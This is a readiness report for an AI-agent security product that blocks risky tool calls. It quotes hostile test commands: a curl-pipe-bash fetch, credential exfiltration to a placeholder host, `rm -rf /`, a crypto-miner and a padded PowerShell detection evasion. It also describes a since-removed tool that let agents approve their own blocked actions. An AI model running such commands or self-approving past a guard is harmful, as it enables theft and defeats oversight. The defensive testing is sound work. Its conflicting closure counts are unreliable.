| Bağımlılık ve gizli anahtar | Ana depo production/build audit: 0 bilinen açık. Landing production audit: 0; tam audit'te upstream düzeltmesi bulunmayan geliştirme ESLint zincirindeki `braces@3.0.3` için 1 high kalır; tarama muaf tutulmadı. Resmî checksum doğrulanmış Gitleaks 8.30.1 ile ana checkout 8026, landing checkout 251 dosyada temiz. İki repo CI'sında güncel kaynak taraması var; release history tarayıcısının sürüm uyuşmazlığı ve kısmi tarama riski düzeltildi. Geçmişte ana depo 132, landing 6 bulgu ile hâlâ exit 1 verir. [Ana depo triage](docs/production-readiness/secret-history-triage-2026-10-05.md) iki owner-confirm kaydını açık tutar; landing'in altı bilinen sentetik/public fixture'ı da Security kabulü yerine geçmez. |
| Production doctor | [Doctor kanıtı](coverage/ops-rehearsal-aidr-ops-20261005222422/doctor-evidence.json) `passed:false`. Aynı izole konfigürasyonun [ayrı readiness teşhisi](.tmp-test/production-hardening-2026-10-05/operations-readiness-diagnosis.json) database/storage/functions bağlantılarını doğruladı: 503 nedeni signing/backup/queue sağlık kanıtlarının yokluğu ve loopback HTTP'de HTTPS sertifikasının yapılandırılmaması. Host scheduler kabulü de açık. Sağlıklı process/API smoke production kabulü yerine kullanılmadı. |

Test sayıları farklı suite'lerin kendi kapsamıdır; örtüşen kontroller toplanıp tek başarı yüzdesi üretilmez. İmzalanmamış geliştirme artefact'ı, sentetik test receipt'i, gerçek provider veya müşteri kanıtı yerine geçmez.

### Kalan ürün sınırları

- Kurumsal takım/RBAC/OIDC/SCIM yetenekleri Supabase tabanlı kontrol düzlemindedir. `aidr-landing` yönetilen SaaS'ı bireysel Clerk hesabına bağlıdır; ortak organizasyon, delegasyon ve çok kullanıcılı kurumsal yetki modeli yoktur. İki kişi onayı bu modelde tam çalışmaz. Landing metinleri bu ayrımı açıklar.
- Privacy paketi bütün ana ürün/native/browser/provider çıkışlarına bağlı değildir; onaylanmış kurum NER modeli ve gerçek broker/MDM entegrasyonu yoktur. Paket testleri eksiksiz veri sızıntısı engelleme iddiasını desteklemez.
- Native host'un hook crash/timeout davranışı üründen bağımsız bir sınırdır; özellikle Codex'te denetim kancası çöker veya devre dışı kalırsa host işlemi engellemeden sürdürebilir. AutoSecOps'un güncel upstream'i tarihsel WT08 ingress yolunu kaldırmıştır. Eski protokol testi çalışan güncel entegrasyon sayılmaz.
- Varsayılan reputation/control-plane hizmetleri için çalışan production endpoint ve sağlayıcı kabulü doğrulanmamıştır. Özel endpoint/credential yolu düzeltildi; gerçek servis ve erişim gerekiyor.
- SAML canlı sağlayıcı ve politika geçişi/break-glass kabulü, gerçek SIEM teslimi, yayıncı imzaları, ağ bypass engeli ve müşteri host rollout'u açık kalır. [Güncel kurumsal yetenek kapsamı](docs/production-readiness/enterprise-feature-verification-2026-10-05.md).

### Kurumsal satış ve production için sıradaki kabul adımları

1. **Satılacak kapsamı ve müşteri ortamını sabitle:** dağıtım modeli, desteklenen agent/host sürümleri, kurum içi ağ ve veri akışları, retention ve destek şartlarını aynı aday sürüm için kaydet. Mevcut kurumsal self-hosted yolu, bireysel yönetilen SaaS'tan ayrı değerlendir. Tedarikçi başvurusu ve proje şartları ayrıca gerekir: [BMC](https://www.bmc.com.tr/hizmetler/satin-alma), [ASELSAN](https://www.aselsan.com/supply-chain), [HAVELSAN](https://www.havelsan.com/tr/is-ekosistemi). Kamuya açık bu kaynaklar her yazılım alımı için evrensel SOC 2/ISO 27001/Kubernetes zorunluluğu kanıtlamaz.
2. **Teslim edilecek sürümü üret:** temiz commit, exact candidate digest, SBOM/lisans/provenance ve bağımsız güven politikası; gerçek yayıncı anahtarları, saklama/rotasyon ve gerekiyorsa Authenticode/Apple imzaları. Geçmişteki iki dataset-key owner-confirm kaydını güvenlik sahibi çözmeli; bağımsız değerlendirme ve yeniden test gerekir.
3. **Gerçek entegrasyonları kabul et:** production TLS/DNS, IdP ve offboarding, ilk enrollment/anahtar yenileme, satılan kanala göre ödeme veya fatura yetkilendirmesi, SIEM, gerçek agent host'unda engellenen işlemin yan etkisinin oluşmaması ve offline/yükseltme/rollback senaryoları. Demo/yerel test bunun yerine geçmez.
4. **İşletme kanıtını tamamla:** müşteri host scheduler ve fleet queue, farklı makineye offsite geri yükleme, ölçülmüş RPO/RTO, müşteri verisinde yanlış alarm/kaçırma ve gerçek kapasite, isimli destek/güvenlik sorumlusu ve olay tatbikatı. Ölçülmeden SLA taahhüdü verilmez.
5. **Hukuk/ticaret ve müşteri kabulünü bağla:** lisans/IP/notice istisnaları, veri işleme/gizlilik şartları, onaylı teklif/sipariş/fiyat, support/renewal/offboarding ve müşteri PoV kabulünü aynı adayın kanıt indeksine bağla. [İlk müşteri kabul listesi](docs/production-readiness/first-customer-ready.md), [isimli sahip aksiyonları](docs/production-readiness/commercial-gates-prefill-and-owner-actions-2026-10-05.md) ve [açık satış işleri](PRODUCTION_SALES_GAPS.md) bu kapıları kaydeder.

`commercial-gate-receipts.json` içindeki 13 kapı hâlâ açıktır; kaynak incelemesi bunları otomatik onaylamaz. `FEATURE_INVENTORY.json` 71 yeteneği kaydeder: 41 wired, 28 partial, 2 external. “Wired” production kabulü veya eksiksiz saldırı önleme anlamına gelmez. `.release-evidence/v8-evidence-index.json` bu checkout'ta yoktur; eski bir kanıt indeksi bu çalışma ağacının kabulü sayılamaz.

---

## Tarihsel kayıt — Eylül 2026

Önceki kayıtlar: [v4](docs/production-readiness/2026-09-12-customer-candidate-v4.md), [11 Eylül doğrulaması](docs/production-readiness/2026-09-11-delivery-verification.md). Aşağıdaki sayılar ve açık/kapalı durumları o tarihlere aittir; güncel karar için üstteki kayıt ve `READINESS_BACKLOG.json` kullanılır.

**Assessment date:** 2026-09-10
**Baseline commit:** `b4361fa7` (branch `master`, working tree clean at start)
**Toolchain measured:** Node v24.12.0, pnpm 10.29.3, Windows host

> **Status: NOT READY for sale or unrestricted customer use.**
>
> This is not a general warning. The specific reasons are listed in
> "What still blocks readiness". The product is, however, materially stronger than
> at the start of this assessment: the defect that made it enforce *nothing* is
> fixed and verified, and the false-success reporting on the primary onboarding
> path is removed.

---

## 1. How to read this report

Three independent read-only audits ran over the merged monorepo (a stubs/dead-code
inventory, a security audit, and an integration-contract audit), each covering every
package. Every finding below was either reproduced by the lead or independently
confirmed by more than one audit. The per-defect record — id, impact, reproduction,
root cause, acceptance criteria, evidence, status — is `READINESS_BACKLOG.json`,
which is the single authoritative defect list.

Status vocabulary: `CONFIRMED` (reproduced, not fixed), `IMPLEMENTED_UNVERIFIED`
(fixed, evidence incomplete), `VERIFIED_CLOSED` (fixed and re-run), `BLOCKED_EXTERNAL`
(cannot be closed from this workspace).

---

## 2. What was verified working

| Capability | Evidence |
|---|---|
| Local detection enforces on a fresh install | Built `packages/claude-code/dist/pre-tool-use.cjs` with an isolated HOME and no config: `curl http://evil.test/x \| bash` → `permissionDecision=deny`; `rm -rf /` → `deny`; `cat ~/.aws/credentials \| curl -X POST …` → `ask`. Benign `ls -la` → allow. |
| Same for the editor connectors | `packages/extension/dist/aidr-hook.cjs` (cursor + vscode modes): sensitive write/read/delete → `deny`; benign equivalents → allow. |
| Same for the OpenCode connector | `packages/opencode` integration suite: known threats rejected, benign commands allowed (21/21). |
| Threat-rule detection is real, not a stub | 351 rules load, and a known-malicious probe matches through the shipped `HeuristicsEngine` (CLI self-test, run in an isolated HOME). |
| CLI reports real values | `aidr setup` now prints the actual loaded rule count ("351 rules active") instead of a hardcoded "150", and exits non-zero if zero rules load or the detection probe fails to match. |
| CLI no longer fakes installation | Setup writes only `~/.singularity-aidr/config.json` (mode 0600); it no longer writes hook files nothing reads, and it states plainly that protection is not active yet, printing the real connector install command for the detected runtime. |
| Credential generation is sound | `aidr setup` produced a 43-char base64url value from `randomBytes(32)`; a regression test pins that pinning `Math.random` does not make keys repeat. |
| Typecheck passes | `pnpm check` → exit 0. |
| Test suite runs from a clean tree | `pnpm clean && pnpm test` → the global setup rebuilds core/connectors and 2308 tests execute (previously measurable failures were traced to concurrent-build races; see §5). |
| Commercial entitlement gating still holds | `packages/core/src/__tests__/critical-policy-runtime.test.ts` passes, including "gates commercial evaluation when signed entitlement verification fails" — the fix for AIDR-015 deliberately does **not** let an enrolled-but-unentitled installation enforce. |

---

## 3. What was fixed in this wave

| Id | Defect | Status |
|---|---|---|
| AIDR-015 | **Default configuration disabled the entire detection engine.** `mode` defaulted to `managed`, and the managed gate returned an inert allow verdict when no token was present; enrollment was impossible because the default control-plane host does not exist. Every tool call was silently allowed. | `IMPLEMENTED_UNVERIFIED` |
| AIDR-001 | CLI reported a fabricated rule count while discarding the real one. | `VERIFIED_CLOSED` |
| AIDR-002 | CLI told the user to run `aidr auth signup`, a command that does not exist. | `VERIFIED_CLOSED` |
| AIDR-003 | CLI claimed a hook integration it never performed (wrote files no agent reads). | `VERIFIED_CLOSED` |
| AIDR-004 | CLI "self-test" tested nothing (`Math.random`/hash-length checks, with the engine probe swallowed). | `VERIFIED_CLOSED` |
| AIDR-005 | API key derived from `Math.random()`. | `VERIFIED_CLOSED` |
| AIDR-006 | Generated generic hook invoked the non-existent `aidr check`. | `VERIFIED_CLOSED` |
| AIDR-012 | 23 tracked scratch/lint logs at the repo root, several containing the contributor's absolute host paths. | `VERIFIED_CLOSED` |
| AIDR-013 | Three mutually contradictory status documents presented as current. | `VERIFIED_CLOSED` (records now labelled superseded and point at the authoritative sources) |
| AIDR-025 | `packages/claude-code/dist/health.cjs` is the package's declared `bin` and is emitted by every build, but was gitignored — so a clean checkout lacks it and CI's "enforce clean diff after build" step fails. | `IMPLEMENTED_UNVERIFIED` |
| AIDR-026 | The SDK still shipped a complete Lemon Squeezy client whose `processWebhook` skipped verification when no secret was configured and compared non-constant-time, reachable from the SDK CLI. | `VERIFIED_CLOSED` |
| AIDR-027 | **No threat-rule coverage for cryptomining at all.** `xmrig --donate-level 1 -o pool.evil.test:3333` returns `allow`; a grep for miner/mining/xmrig/monero/stratum/hashrate across all 22 rule files returns zero matches. | `CONFIRMED` |
| AIDR-028 | **The AIG dataset was dead weight because the compiler discarded the detection logic**, and the compiled data was not shipped in `dist` at all. Rebuilt natively: dataset upgraded to upstream v4.6.1 (2,043 CVEs / 115 frameworks / 146 fingerprints), 146/146 fingerprints now carry executable HTTP detection, `aidr scan` exposes it to operators, and the data ships in `dist/generated/`. | `IN_PROGRESS` (session-start + policy wiring outstanding) |
| AIDR-029 | `AutoQuarantine`'s constructor called two `async` helpers without awaiting, so a fresh instance reported an empty quarantine even when files were held on disk, and failures became unhandled rejections. | `VERIFIED_CLOSED` |
| AIDR-030 | The ADR **response** lifecycle (quarantine / contain / rollback / response audit) is not wired to the verdict path — the modules form a closed island. The product is detect-and-block only, despite the name. | `IN_PROGRESS` (response path + snapshot + audit + user-visible message now live; rollback and the signed chain remain) |
| AIDR-020 | **Silent degradation fixed.** `evaluateToolCall` allowed a call with `reasons: []` whenever zero rules loaded — no rules dir, a wrong path, or an empty dir were all enough to make the product a no-op while reporting success. It now returns `ask` / `detection_unavailable` naming the path, and stays silent only when heuristics are explicitly disabled or there is nothing to inspect. Scoped-package and `sha512` false-cleans remain open. | `IN_PROGRESS` |
| — | Tier-2 tests asserted threats were **allowed** (`expect(parseResponse(stdout)).toEqual({})` for `rm -rf /`, `curl \| bash`, `.ssh/authorized_keys`), which is why a green suite coexisted with a non-enforcing product. | Rewritten to assert real blocks: claude-code 28 passed / 1 deliberately skipped, extension 17/17, opencode 21/21. |
| — | A URL-reputation test passed only because it asserted an allow response when the reputation endpoint was unreachable. | Replaced with an explicitly skipped, documented test (AIDR-020); it no longer reports a false pass. |

---

## 4. What still blocks readiness

### 4.1 Confirmed defects not yet closed

`READINESS_BACKLOG.json` is authoritative. Validate the current backlog and print its
status and priority summary with `node scripts/validate-backlog.mjs`. At the time of writing **25 of 30 findings are
`VERIFIED_CLOSED` and 5 remain open — 3 × P0, 1 × P1, 1 × P2**:

| Finding | Priority | Status | Subject |
|---|---|---|---|
| AIDR-016 | P0 | `BLOCKED_EXTERNAL` | No control plane deployed; managed enrollment cannot complete |
| AIDR-023 | P0 | `IMPLEMENTED_UNVERIFIED` | Stripe webhook implemented, but no checkout session creates it and no secret is provisioned |
| AIDR-028 | P0 | `IN_PROGRESS` | AIG session-start summary + policy action on critical CVEs; fate of `services/aig-bridge` |
| AIDR-019 | P1 | `CONFIRMED` | Dashboard/Edge-Function contract incomplete (8 functions the UI calls do not exist) |
| AIDR-012 | P2 | `CONFIRMED` | Root repository hygiene |

Closed with evidence in the ledger: **AIDR-017** (Codex is now a real, verified
connector), **AIDR-018** (SDK packaging + config validation, verified against a real
tarball), **AIDR-020** (reputation clients throw a typed error instead of returning an
empty array; partial batch coverage is reported), **AIDR-008/009/010** (dashboard team
admin and policy editor reachable; dead modules triaged), **AIDR-011** (all 20 Edge
Functions fail fast), **AIDR-027** (351 rules including 17 cryptomining rules, verified
through the built hook), **AIDR-030** (rollback + signed response chain, demonstrated
end-to-end), **AIDR-024** (`aidr status` now measures instead of asserting, and exits
non-zero when nothing is protecting the machine), **AIDR-007** (setup rerun honesty;
the editor-settings rewrite is gone) and **AIDR-025** (declared `bin` artifacts present
and the build is byte-for-byte deterministic).

AIDR-022 (agent self-approval) was on this list and is now **`VERIFIED_CLOSED`**: the
agent-callable approval tool is gone from both connectors, the OpenCode path is
covered by `aidr-contract.test.ts` and `integration.test.ts`, and the full suite is
green in a single run.

### 4.1.1 Closed in this wave but not yet independently re-verified end-to-end

- **AIDR-022 (agent self-approval)** — `packages/openclaw/src/gate-tool.ts` deleted;
  no approval tool is registered in OpenClaw or OpenCode. `formatAskMessage` no longer
  hands the model a callable approval recipe. Independently re-run by the lead:
  `npx vitest run packages/openclaw/src/__tests__/gate-tool.test.ts` → exit 0, **5/5
  passed**, including the adversarial case that invokes *every* registered tool with
  `approved: true` and asserts the retry stays blocked, plus an out-of-band approval
  that still works. OpenCode's contract suite: exit 0, **7/7 passed**. Model-facing
  docs (`skills/security-awareness/SKILL.md`, both platform guides,
  `docs/architecture.md`, `CLAUDE.md`, both package READMEs) were corrected, since
  they still instructed the model to call the removed tool.

- **AIDR-018 (SDK enforcement half)** — `packages/sdk/src/enforcement.ts` implements a
  single rule used by `wrap()`, `express()`, `nextjs()` and all five adapters: execute
  only on `allow`, or on `ask` that a caller-supplied `onAsk` approves; `deny` is never
  approvable; indeterminate and inconsistent results are blocked by default.
  Independently re-run by the lead: `npx vitest run packages/sdk --root .` → exit 0,
  **60/60 passed**, of which 34 are the new enforcement tests. The `init()`/packaging
  defect and the unparsed `SDKConfigSchema` (`retries` can be `undefined`) remain open
  and are recorded in the backlog.

- **AIDR-023 (Stripe migration)** — the unverified Lemon Squeezy webhook and the
  always-true `verifyWebhookSignature` client helper are deleted, replaced by
  `supabase/functions/stripe-webhook/`. Independently re-run by the lead:
  `npx vitest run supabase --root .` → exit 0, **78/78 passed**; the
  constant-time compare was read and confirmed (`diff |= a[i] ^ b[i]` XOR
  accumulation, no early exit on content), and the tolerance parser explicitly
  guards the NaN-disables-the-window defect. **However** the handler is undeployed,
  `STRIPE_WEBHOOK_SECRET` is unprovisioned, and no Stripe Checkout session is created
  anywhere (`billing-checkout` still returns a Paddle URL), so real events would
  resolve as `unlinked` and grant nothing. Status remains `IMPLEMENTED_UNVERIFIED`.

- **AIDR-026 (residual Lemon path)** — **fixed and verified.** The dashboard path was
  already gone; the SDK's `LemonSqueezyBilling` client (whose `processWebhook` skipped
  verification entirely when no secret was configured, compared non-constant-time, and
  HMAC'd a re-serialized object) has now been deleted, along with the three SDK
  `billing:*` CLI commands. Provider-agnostic licence types moved to
  `packages/sdk/src/license.ts`. Verified by the lead:
  `cd packages/sdk && npx tsc --noEmit` → exit 0; `vitest run packages/sdk` → exit 0,
  **60/60**; plus a new 8-test regression suite that fails if the path is reintroduced.

- **AIDR-021 (ReDoS) — a correction worth reading.** The first fix replaced unbounded `.*`
  with `.{0,300}` across 188 patterns. I audited every changed pattern against
  realistic attack samples and found **zero regressions** for all but one class — but
  that class is a genuine detection *evasion*, reproduced end-to-end:

  ```
  powershell -ExecutionPolicy Bypass <1179 chars of args> -NoProfile -File ./a.ps1
    -> permissionDecision = allow        (EVADED)
    original: ...Bypass.*-NoProfile            matched = true
    current:  ...Bypass.{0,300}-NoProfile      matched = false
  ```

  Long argument lists between those two flags are an ordinary malware shape, and this
  pattern was **not** one of the slow ones (0.07 ms on the same input). So the blanket
  bound traded a performance defect for a detection defect.

  **Closed.** The blanket `{0,300}` was replaced with a *tempered span* —
  `(?:(?!(?:curl|wget))[^\n])*` — which is linear in the input and unbounded in gap
  length, so it can no longer be pushed past a delimiter by padding. Verified 13/13
  end-to-end, including the 1179-character evasion above. The remaining slow patterns
  that chained two bounded gaps are gone with it. Because no in-process wall-clock
  timeout can interrupt a synchronous regex, the load-independent guarantees are the
  64 KB artifact cap and a static check that no rule reintroduces an unbounded or
  paired-bounded gap; `regex-performance.test.ts` keeps a wall-clock ceiling only as a
  coarse net (raised to 10 s with the reasoning recorded, since the same case measured
  4275 ms under full parallel load versus ~200 ms in isolation — a wall-clock bound
  cannot distinguish a slow algorithm from a busy machine).

> **Correction to an earlier draft of this report.** A previous revision of this
> section described AIDR-018, AIDR-021 and AIDR-022 as "fixes under active
> development" and told the reader to treat them as **not** closed. That is no longer
> accurate and the wording is retained here only so the change is auditable: AIDR-021
> and AIDR-022 are now `VERIFIED_CLOSED` with the evidence above, and AIDR-018's
> enforcement half is closed with only the `init()`/packaging half still open. The
> deleted files named in that note (`gate-tool.ts`, `lemon-client.ts`,
> `lemon-webhook/index.ts`) are still deleted, by design.

### 4.2 External gates (unchanged, not closeable here)

`docs/production-readiness/commercial-go-evidence-registry.json` records 13 hard
gates — COM-001…COM-013, SEC-EXT-001, POV-001, INV-001, CLM-001 — requiring counsel
approval, a signed commercial manifest, customer/investor evaluation, deployed
regional infrastructure, signing keys, and an independent penetration test. **No
repository change can close these and none is claimed to.** The registry decision
remains `NO-GO`.

### 4.3 Not verified (must not be reported as working)

- Any deployed environment: no Supabase project, no AIG bridge stack, no regional
  cells were available, so RLS behaviour, webhook endpoints, migration history and
  multi-tenant isolation are **unverified against a live system**.
- Real-host connector E2E (Claude CLI, Cursor, VS Code, OpenClaw gateway) was not
  executed; only the built hook bundles were driven directly.
- The AIG integration (`services/aig-bridge`) is unit-tested in its own suite but its
  readiness path cannot become ready with the shipped `.env.aig` configuration, and
  no AIG worker was run.
- Microsoft Defender/AMSI scanning was not exercised (Windows-only path, and its
  results are dropped when unavailable).

---

## 5. Test and quality-gate results (measured, not assumed)

| Check | Result |
|---|---|
| `pnpm install --frozen-lockfile` | exit 0 |
| `pnpm check` (typecheck) | exit 0 |
| `pnpm clean && pnpm build` | **exit 0**, idempotent on re-run; all five connectors report `[core] up to date; skipping rebuild` |
| `pnpm test:ci` (deterministic gate: build once, then verify artifacts) | **exit 0 — 147 files, 2308 passed / 1 skipped (2309)** |
| `pnpm test` from a clean tree | exit 0 — builds once via the global setup, then 147 files / 2308 passed |
| `pnpm verify:enforcement` (built connector bundles, 8 install shapes × 9 commands) | **exit 0 — 72/72 cases. Default and `AIDR_COMMERCIAL=1` builds each block all five malicious shapes and allow all four benign controls from a fresh install (no config), `mode:managed`, `managed`+empty key, `managed`+bogus key and `managed`+`require_signed_entitlements`.** |
| Deterministic-gate fail-closed check | **verified**: with `AIDR_TEST_NO_BUILD=1` and `packages/core/dist/index.js` deleted, the setup fails loudly instead of rebuilding |
| `packages/core` alone | exit 0 — 114 files, 1929/1929 |
| Package tests (whole package, not hand-picked files) | `packages/core` 114 files / 1929 passed · `packages/claude-code` 67 passed / 1 skipped · `packages/opencode` 40 passed · `packages/openclaw` 20 passed · `packages/extension` 17 passed · `packages/cli` 17 passed · `packages/sdk` 68 passed · `supabase` 78 passed |
| Targeted regression files added this round | `managed-mode-disarm.test.ts` 16 passed · `format.test.ts` (banner honesty) · `degraded-detection.test.ts` 8 passed · `package-false-clean.test.ts` 9 passed |
| Combined connector + CLI regression sweep | **46/46 passed, exit 0** |
| `aidr scan` end-to-end (real local HTTP server) | identified the served product and matched 3 real CVEs, exit 2 — verified by the lead |
| Threat-detection end-to-end (built hook, 13 cases) | 13/13 — malicious variants all block, benign controls all allow |
| Response layer end-to-end (real guard + real rule bundle) | snapshot taken, audit entry written, user-visible message names the vault path — verified by the lead |
| `test:e2e` (real hosts) | **not run** — prerequisites absent |

**Test-infrastructure defect (AIDR-014) — root-caused and fixed.** What looked like
two `packages/opencode` contract tests timing out at 30 s was really a build race:
**every connector's build script started with `pnpm -C ../core build`, whose first
action is `rmrf dist`.** Under `pnpm -r` those packages build concurrently, so four
processes deleted and recreated the same `packages/core/dist` tree at once, and
anything importing core during that window failed with "Failed to resolve entry for
package @singularityrd/aidr-core".

The fix removes the race by construction:

- `scripts/ensure-core-build.mjs` builds core only when it is genuinely stale, and
  every connector calls it instead of blindly rebuilding. (The freshness check must
  compare only `.ts` inputs, because core's own `copy-generated` step writes
  `src/generated/*.json` *after* `tsc` runs.)
- `scripts/build-workspace.mjs` replaces `pnpm -r run build` as the root build: it
  builds core **once to completion**, then builds the rest with
  `AIDR_WORKSPACE_BUILD=1`, in which mode the guard *refuses* to rebuild core rather
  than doing so under a sibling's bundler.
- `pnpm test:ci` (`scripts/run-tests-ci.mjs`) builds once, then runs the suite with
  `AIDR_TEST_NO_BUILD=1`, so the global setup **verifies** artifacts instead of
  rebuilding them. A missing artifact now fails with an explicit message rather than
  being silently rebuilt — verified by deleting `packages/core/dist/index.js` and
  observing the intended failure.

Two further defects surfaced while fixing this, both real:

1. **The CLI consumed core but never depended on core being built**, so a clean
   `pnpm build` failed with five `TS2307` errors. Fixed.
2. **`aig-infra-scan.ts` used `import.meta.url` for path resolution**, which esbuild
   empties in CJS output (`empty-import-meta`) — so the copy bundled into every
   connector had a broken data path. It now prefers `__dirname` and walks up to the
   package root.

`pnpm clean && pnpm build` is now green and idempotent, with all five connectors
reporting `[core] up to date; skipping rebuild`.

---

## 6. Where the evidence lives

- `READINESS_BACKLOG.json` — every finding with id, impact, reproduction, acceptance
  criteria, verification method, status and evidence strings.
- This report — the assessment and the honest boundary between verified and
  unverified.
- `docs/production-readiness/` — the commercial gate registry and templates.
- `IMPLEMENTATION_STATUS.md`, `AIDR_PROJECT_AUDIT.md`, `FEATURE_MAP.md` — retained as
  **historical** records, explicitly labelled superseded, because their claims were
  contradicted by measurement.

---

## 7. Bottom line

The headline risk at the start of this assessment was that Singularity AIDR was a
security product that enforced nothing by default while reporting success — and its
own test suite asserted that behaviour, so nothing caught it. That is fixed and
verified, and the fix was **deeper than the first pass found**: the same disarm was
still reachable through `mode: "managed"`, which is what the commercial build forces,
so every un-enrolled commercial install was inert (and in the commercial flavor it
returned a blanket `managed_disabled` verdict on *every* tool call, including
`ls -la`, which would have made the product unusable as well as undetective). That
path, a second independent disarm through `require_signed_entitlements`, and the
misleading `Disabled (auth_required)` banner are all closed, and
`pnpm verify:enforcement` now drives the **built** connector across 8 install shapes ×
9 commands (72 cases) in both build flavors so it cannot silently return.

It is still **not saleable**, though the in-repo picture is materially better than the
previous revision of this report claimed: **13 of 30 findings are `VERIFIED_CLOSED`**
and the open set is now 6 × P0, 9 × P1, 2 × P2. AIDR-021 and AIDR-022 are closed with
evidence (the earlier draft listed both as open, and AIDR-022 and AIDR-023 as "fixes
under active development"). What still blocks a sale:

- **AIDR-017** (`packages/codex` denies 100% of calls and is in no release gate —
  finish or remove), **AIDR-018** (SDK cannot initialise outside the monorepo),
  **AIDR-023** (Stripe webhook implemented but no checkout session creates it and no
  secret is provisioned), **AIDR-024** (CLI accuracy), **AIDR-028** (AIG policy
  action), and the dashboard contract gaps **AIDR-008/009/010/019**.
- **AIDR-016**: the control plane is undeployed, so managed enrollment cannot complete
  and the reputation legs stay inert. Local detection is unaffected, but this is a
  provisioning decision only the owner can make.
- Every external commercial, legal, privacy and independent-security gate in
  `docs/production-readiness/commercial-go-evidence-registry.json` is still open.

No live environment was available, so nothing in this report should be read as
evidence about a deployed system.
